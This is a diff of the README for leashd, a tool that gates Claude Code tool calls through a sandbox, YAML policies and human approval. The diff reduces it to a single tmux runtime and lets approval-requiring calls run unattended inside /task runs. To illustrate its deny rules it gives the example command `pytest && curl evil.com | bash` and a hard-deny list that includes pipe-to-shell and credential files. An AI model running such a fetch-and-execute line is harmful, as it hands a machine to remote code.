@@ -6,13 +6,13 @@
 <a href="https://pypi.org/project/leashd/"><img src="https://img.shields.io/pypi/v/leashd.svg" alt="PyPI"></a>
 <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10%2B-blue.svg" alt="Python 3.10+"></a>
 <a href="#development"><img src="https://img.shields.io/badge/coverage-89%25%2B-brightgreen.svg" alt="Coverage 89%+"></a>
-<a href="#status"><img src="https://img.shields.io/badge/status-alpha-orange.svg" alt="Status: Alpha"></a>
+<a href="#status"><img src="https://img.shields.io/badge/status-stable-brightgreen.svg" alt="Status: Stable"></a>
 <a href="LICENSE"><img src="https://img.shields.io/badge/license-Apache%202.0-blue.svg" alt="License"></a>
 </p>
 
 ---
 
-leashd is a background daemon that runs coding agents on your dev machine and puts a **three-layer safety pipeline** in front of every tool call they make: a path sandbox, YAML policy rules, then you. Risky actions arrive as **Approve / Reject** buttons — in your browser, or on your phone's lock screen.
+leashd is a background daemon that runs Claude Code on your dev machine and puts a **three-layer safety pipeline** in front of every tool call it makes: a path sandbox, YAML policy rules, then you. Risky actions arrive as **Approve / Reject** buttons — in your browser, or on your phone's lock screen.
 
 The point is that you can walk away from the keyboard. Kick off a task from the built-in Web UI, close the laptop, and approve the `git push` from the bus.
 
@@ -40,11 +40,10 @@ Everything lands in an append-only audit trail. Nothing gets past the hard-deny 
 
 ## Why leashd
 
-- **It's a real `claude` TUI, not a wrapper.** The default runtime drives an interactive Claude Code session in a tmux pane and bridges it to chat — so you get the actual CLI's behavior, models, and native slash commands (`/model`, `/compact`, `/context`), with every tool call still routed back through leashd's gatekeeper via `PreToolUse` hooks.
+- **It's a real `claude` TUI, not a wrapper.** leashd drives an interactive Claude Code session in a tmux pane and bridges it to chat — so you get the actual CLI's behavior, models, subagents and native slash commands (`/model`, `/compact`, `/context`), with every tool call still routed back through leashd's gatekeeper via `PreToolUse` hooks.
 - **Approvals that reach you anywhere.** The Web UI is a PWA. Install it on your home screen and approvals arrive as push notifications with the browser closed. `leashd webui tunnel` exposes it over ngrok / Cloudflare / Tailscale in one command.
 - **Policy you can actually read.** Safety is a YAML file, not a prompt. Compound commands are split and evaluated segment-by-segment, deny-wins — `pytest && curl evil.com | bash` is denied.
-- **Autonomous when you want it.** `/task` implements, runs your tests, reviews the diff, drives a real browser against the change, and opens a PR. It stops for the hard-deny floor and escalates instead of looping.
-- **Runtime-agnostic.** tmux, Claude CLI, Claude Code SDK, and OpenAI Codex ship built-in. Same pipeline, same approvals, same audit trail on all of them. Switch with one command.
+- **Autonomous when you want it.** `/task` implements, runs your tests, reviews the diff and, when the change is visible in a running app, drives a real browser against it. It stops for the hard-deny floor and escalates instead of looping.
 - **Local by default.** No account, no third-party service. `localhost`, a SQLite file, and your own API auth.
 
 ---
@@ -59,17 +58,10 @@ leashd start               # daemon starts in the background
 
 Open `http://localhost:8080`, enter your API key, and send something like *"Add a health check endpoint to the FastAPI app"*.
 
-**Prerequisites** — Python 3.10+, plus at least one agent runtime:
-
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) authenticated (`claude` works in your terminal). The default `tmux` runtime also needs `tmux`.
-- or [Codex CLI](https://developers.openai.com/codex/cli) authenticated (`codex` works in your terminal).
+**Prerequisites** — Python 3.10+, `tmux`, and the [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) 2.1.259+ authenticated (`claude` works in your terminal).
 
 <details>
-<summary><b>Optional extras</b></summary>
-
-```bash
-pip install 'leashd[claude-agent-sdk]'   # only for the claude-code (SDK) runtime
-```
+<summary><b>PWA, phone access, Telegram</b></summary>
 
 **Install as a PWA** — in Chrome or Safari, tap "Add to Home Screen" (mobile) or "Install" (desktop) for a standalone app with push notifications.
 
@@ -110,7 +102,7 @@ Every tool call the agent makes passes through three layers before it can execut
 | **2. Policy** | YAML rules classify each call as `allow` / `deny` / `require_approval` by tool name, command pattern, and path pattern. First match wins. Compound bash is split on `&&`, `||`, `;` and evaluated per segment, deny-wins. |
 | **3. Approval** | `require_approval` sends an inline **Approve / Reject** to the Web UI or Telegram. No response within the timeout → denied. |
 
-The pipeline is runtime-agnostic and connector-agnostic: same sandbox, same rules, same buttons whether you're on Claude Code or Codex, browser or phone. Every attempt and decision is appended to `.leashd/audit.jsonl`.
+The pipeline is connector-agnostic: same sandbox, same rules, same buttons whether you're in the browser or on your phone. Every attempt and decision is appended to `.leashd/audit.jsonl`.
 
 **Five policies ship in `policies/`:**
 
@@ -120,7 +112,7 @@ The pipeline is runtime-agnostic and connector-agnostic: same sandbox, same rule
 | **`strict.yaml`** | `Read`, `Glob`, `Grep`, `LS` only | everything else (2-min timeout) |
 | **`permissive.yaml`** | reads, writes, package managers, test runners, `git add/commit/stash`, all browser | git push, network, browser cookies/auth/storage, anything unlisted (10-min timeout) |
 | **`dev-tools.yaml`** *(overlay)* | linters, test runners, package managers | — |
-| **`autonomous.yaml`** | writes, tests, linters, package managers, safe git, `gh pr` | AI-evaluated: feature-branch push, network, browser mutations |
+| **`autonomous.yaml`** | writes, tests, linters, package managers, safe git, `gh pr` | feature-branch push, network, browser mutations (a human in chat; allowed inside `/task`) |
 
 All five sit on top of a **hard-deny floor**: credential files, `sudo`, force push, push to main/master, pipe-to-shell, `chmod 777`, SQL `DROP`/`TRUNCATE`. `rm -rf` sits just under it as `require_approval` — it can never run unattended, but you can wave it through instead of losing the turn.
 
@@ -135,34 +127,19 @@ LEASHD_POLICY_FILES=policies/default.yaml,policies/my-overrides.yaml   # merged,
 
 ---
 
-## Runtimes
+## The tmux runtime
 
-| Runtime | Backend | Session resume | Install | Stability |
-|---|---|---|---|---|
-| **tmux** *(default)* | Interactive `claude` TUI in a tmux pane | Session tokens | `claude` CLI + `tmux` | stable |
-| **claude-cli** | Claude CLI (native subprocess, no SDK) | NDJSON session IDs | `claude` CLI authenticated | beta |
-| **claude-code** | Claude Code CLI (SDK) | SDK sessions | `claude` CLI + `leashd[claude-agent-sdk]` | stable |
-| **codex** | Codex CLI | Thread IDs | `codex` CLI authenticated | beta |
-
-```bash
-leashd runtime list      # what's available
-leashd runtime show      # what's active, and its capabilities
-leashd runtime set codex # switch
-```
-
-All four support interactive approval, streaming, and the full autonomous pipeline. Each declares its capabilities to the engine, which adapts session resume and approval routing automatically.
-
-**The `tmux` runtime** is what makes leashd feel different. It spawns a real interactive `claude` TUI in a tmux pane and talks to it the way a human would — so native slash commands pass straight through from chat, dialogs the CLI opens (model picker, consent prompts) get bridged to inline buttons, and `/screen` gives you a live snapshot of the terminal. Tool calls are intercepted by Claude Code `PreToolUse` hooks and routed back into leashd's gatekeeper, so nothing escapes the pipeline.
+leashd spawns a real interactive `claude` TUI in a tmux pane and talks to it the way a human would — so native slash commands pass straight through from chat, dialogs the CLI opens (model picker, consent prompts) get bridged to inline buttons, and `/screen` gives you a live snapshot of the terminal. Tool calls are intercepted by Claude Code `PreToolUse` hooks and routed back into leashd's gatekeeper, so nothing escapes the pipeline.
 
 **Restarting is safe.** tmux panes live on a tmux server of their own, so `leashd restart` — to pick up a fix, a config change, a new build — no longer ends the work in them. The daemon writes what it needs to find each pane again, leaves them running on the way out, and re-adopts them on the way in: same conversation, same session, same directory. A turn that was still running keeps streaming into the chat where it left off. `leashd stop --end-agents` ends them instead. See [docs/agents.md](docs/agents.md#restarting-without-losing-work).
 
-**Adding your own** — extend `SubprocessAgent` for any CLI-driven agent tool and register it with the runtime registry.
+**Adding a runtime** — the runtime registry (`agents/registry.py`) is kept for that: register a factory and select it with `LEASHD_AGENT_RUNTIME`. Embedders can also pass any `BaseAgent` to `build_engine(agent=...)` to put their own agent behind the same pipeline.
 
 ---
 
 ## Autonomous mode
 
-`/task <description>` hands the whole thing over. The v4 orchestrator runs a linear pipeline:
+`/task <description>` hands the whole thing over. The orchestrator runs a linear pipeline, one fresh Claude session per phase:
 
 ```
 /task "Add health check endpoint"
@@ -170,18 +147,19 @@ All four support interactive approval, streaming, and the full autonomous pipeli
         ├─ implement ─── Claude's native `auto` permission policy;
         │                every tool still gated by the hook pipeline
         │
-        └─ verify ────── your test suite (make check / pytest / npm test)
-                       + a code-quality diff review
-                       + a real browser pass over the change (agent-browser:
-                         a11y, vitals, console, network 4xx/5xx, screenshots)
+        └─ verify ────── your checks (make check / pytest / npm test)
+                       + a diff review (Claude's `code-review` skill)
+                       + a real browser pass when the change is visible in a
+                         running app (agent-browser: a11y, console,
+                         network 4xx/5xx, screenshots)
         │
         ▼
-   PR link — or an escalation message if it gets stuck
+   done — or an escalation message if it gets stuck
 ```
 
-Task memory and git-backed checkpoints survive daemon restarts. When a phase burns its retry budget the orchestrator escalates to you instead of looping. Opt a separate review phase back in with `/task --phases implement,verify,review`.
+Task memory lives in `.leashd/tasks/<run_id>.md` and survives daemon restarts. When a phase burns its retry budget the orchestrator escalates to you instead of looping. Add a read-only review phase with `/task --phases implement,verify,review`, or per project in `.leashd/task-config.yaml`.
 
-In an autonomous run, **AI approval replaces human taps** for `require_approval` calls — a secondary model evaluates each one in context. Plan reviews still come to you. The hard-deny floor still can't be overridden.
+Inside a `/task` run, **`require_approval` calls run without asking** — nobody is there to tap. The sandbox and the hard-deny floor still apply and can't be overridden, so pick the policy you run tasks under accordingly.
 
 ```bash
 leashd orchestrator enable    # turns on /task
@@ -204,7 +182,7 @@ The primary interface — a full chat client on `localhost` with zero external d
 - **27 color themes** (Dracula, Monokai, Catppuccin, Nord, Synthwave, Matrix, …), each with dark and light variants
 - **Conversation tabs and history**, searchable
 - **Directory and workspace switching** without slash commands
-- **Settings page** for runtime, effort, max turns, themes
+- **Settings page** for model, effort, max turns, themes
 - **File attachments** — drag-and-drop photos, screenshots and PDFs, threaded to the agent with vision
 - **Mobile-tuned input** — Enter inserts a newline, Send submits, so multi-line prompts work on a phone keyboard
 
@@ -249,9 +227,8 @@ Available in both the Web UI and Telegram.
 | Command | Description |
 |---|---|
 | `/task <description>` | Autonomous: implement → verify → PR |
-| `/goal <condition>` | Set a completion condition the agent works toward across turns until a fast model confirms it's met *(tmux runtime)* |
+| `/goal <condition>` | Set a completion condition the agent works toward across turns until a fast model confirms it's met |
 | `/web <instruction>` | Autonomous web automation with content-level human approval |
-| `/test` | 9-phase agent-driven test workflow with browser automation |
 | `/plan <text>` | Plan mode — agent proposes, you approve before execution |
 | `/edit <text>` | Edit mode — direct implementation |
 | `/auto <text>` | Auto mode — Claude's native auto permission policy; leashd intercepts escalations |
@@ -261,7 +238,7 @@ Available in both the Web UI and Telegram.
 | `/ws` | Manage workspaces inline. Blocked while an agent is running |
 | `/git <subcommand>` | Full git suite: status, branch, checkout, diff, log, add, commit, push, pull |
 | `/file <path>` | Send a real file from an approved directory to the chat (globs work) |
-| `/screen` | Snapshot of the live `claude` terminal *(tmux runtime)* |
+| `/screen` | Snapshot of the live `claude` terminal |
 | `/stop` | Stop all ongoing work without resetting the session |
 | `/resume` | Reattach a conversation dropped by a timeout, interrupt, or `/stop`. `/resume <message>` does both at once |
 | `/cancel` | Cancel the active task in this chat |
@@ -270,26 +247,20 @@ Available in both the Web UI and Telegram.
 | `/status` | Current session, mode, and directory |
 | `/clear` | Clear history, cancel active tasks, start fresh |
 
-On the `tmux` runtime, Claude's own slash commands (`/model`, `/compact`, `/context`, `/cost`, `/help`, …) pass straight through to the TUI, and any dialog they open is bridged to inline buttons.
+Claude's own slash commands (`/model`, `/compact`, `/context`, `/cost`, `/help`, …) pass straight through to the TUI, and any dialog they open is bridged to inline buttons.
 
 ---
 
 ## Browser automation
 
-Two backends power `/web` and `/test`, both gated by the same safety pipeline:
+Two backends power `/web` and the `/task` verify pass, both gated by the same safety pipeline:
 
 | Backend | Install | Best for |
 |---|---|---|
 | [agent-browser](https://github.com/vercel-labs/agent-browser) *(default)* | `npm i -g agent-browser && agent-browser install` | Fast Rust CLI, accessibility-tree snapshots with deterministic refs (`@e1`), headless by default, cloud providers + iOS Simulator |
-| [Playwright MCP](https://github.com/playwright-community/mcp) | `npx playwright install chromium` | Test generation, MCP-native tooling |
+| [Playwright MCP](https://github.com/playwright-community/mcp) *(optional)* | Node.js + `npx playwright install chromium` | MCP-native tooling |
 
-Read-only tools (snapshots, screenshots) are auto-allowed in `default.yaml`; mutations (click, navigate, type) require approval. `auth` / `cookies` / `storage` / `clipboard` are policy-gated and never auto-approved. `/web` sessions checkpoint their progress, so a crash mid-workflow resumes instead of restarting.
-
-```
-1. start your dev server (npm run dev, uvicorn, …)
-2. /test --url http://localhost:3000
-3. the agent navigates, verifies, and reports — each mutation needs your tap
-```
+agent-browser browsing runs without asking by default (`leashd browser auto-approve off` to tap for each step). `auth` / `cookies` / `storage` / `clipboard` stay policy-gated and are never auto-approved. `/web` sessions checkpoint their progress, so a crash mid-workflow resumes instead of restarting.
 
 See [docs/browser-testing.md](docs/browser-testing.md) for Chrome profile paths, the full tool reference, and policy details.
 
@@ -319,7 +290,7 @@ environment variables   ← highest priority
 All settings are env vars prefixed with `LEASHD_`. See [docs/configuration.md](docs/configuration.md) for the full 40+ setting reference.
 
 <details>
-<summary><b>CLI reference</b> — daemon, dirs, runtimes, Web UI, browser, plugins, skills, workspaces</summary>
+<summary><b>CLI reference</b> — daemon, dirs, model, Web UI, browser, plugins, skills, workspaces</summary>
 
 ```bash
 # Daemon
@@ -340,9 +311,8 @@ leashd add-dir /path/to/project
 leashd remove-dir /path/to/project
 leashd dirs
 
-# Runtimes
-leashd runtime list / show
-leashd runtime set <tmux|claude-cli|claude-code|codex>
+# Model
+leashd model show / set <opus|sonnet|claude-…> / clear
 
 # Task orchestrator
 leashd orchestrator enable / disable / show
@@ -357,11 +327,11 @@ leashd browser set-backend agent-browser
 leashd browser set-profile ~/.leashd/browser-profile
 leashd browser clear-profile
 leashd browser headless
-leashd browser auto-approve on   # approve agent-browser browsing in every conversation
+leashd browser auto-approve off  # tap for each agent-browser step (on by default)
 
 # Agent tuning
-leashd effort show / set <low|medium|high|xhigh|max>    # default: xhigh
-leashd turns show / set <N>
+leashd effort show / set <low|medium|high|xhigh|max>    # default: medium
+leashd turns show / set <N>                              # default: 120
 
 # Plugins and skills
 leashd plugin list / add <source> / remove <name> / enable <name> / disable <name>
@@ -409,7 +379,7 @@ request_completed
 
 ## Architecture
 
-The **Engine** receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the active runtime, and sends responses back. The **MultiConnector** routes by `chat_id` so the Web UI and Telegram share one engine — sessions, approvals and task state are unified. The **RuntimeRegistry** manages pluggable backends, each declaring its capabilities. Every tool call is intercepted by the **Gatekeeper**, which orchestrates the three-layer pipeline. An **EventBus** decouples subsystems — plugins subscribe to `tool.allowed`, `tool.denied`, `approval.requested`, `task.submitted`. The **TaskOrchestrator** runs the implement → verify pipeline with persistent task memory.
+The **Engine** receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the tmux runtime, and sends responses back. The **MultiConnector** routes by `chat_id` so the Web UI and Telegram share one engine — sessions, approvals and task state are unified. Every tool call is intercepted by the **Gatekeeper**, which orchestrates the three-layer pipeline. An **EventBus** decouples subsystems — plugins subscribe to `tool.allowed`, `tool.denied`, `approval.requested`, `task.submitted`. The **TaskOrchestrator** runs the implement → verify pipeline with persistent task memory.
 
 ```
 Web UI connector ────┐
@@ -419,17 +389,13 @@ Telegram connector ──┘         │
                                │
                             Engine ──── EventBus ──── TaskOrchestrator (implement → verify)
                                │                       TaskMemory
-                          RuntimeRegistry
-                               ├─ tmux (default)
-                               ├─ Claude CLI
-                               ├─ Claude Code (SDK)
-                               └─ Codex
+                          tmux runtime (claude TUI)
                                │
                           Gatekeeper ──────────────────────────────┐
                                │                                   │
-                          Active agent runtime          1. Sandbox check
+                          PreToolUse hooks              1. Sandbox check
                                │                        2. Policy rule match
-                               └── tool call ──────────▶ 3. Human / AI approval
+                               └── tool call ──────────▶ 3. Human approval
 ```
 
 Deeper detail in [docs/index.md](docs/index.md).
@@ -456,7 +422,7 @@ CI runs unit and E2E separately so Playwright setup issues don't block unit resu
 
 ## Status
 
-leashd is **alpha** — the API and config schema may still change between versions. The core (daemon, safety pipeline, Web UI, Telegram, policy engine, task orchestrator, multi-runtime) is stable and tested at 89%+ coverage. Not recommended where an agent action could be irreversible without review.
+leashd is **stable**: the config schema and CLI follow semantic versioning, so breaking changes land only in a major release. The core (daemon, safety pipeline, Web UI, Telegram, policy engine, task orchestrator, tmux runtime) is tested at 89%+ coverage. Not recommended where an agent action could be irreversible without review.
 
 Recent releases are in [CHANGELOG.md](CHANGELOG.md). Bugs and ideas: [open an issue](https://github.com/vmehera123/leashd/issues).
 
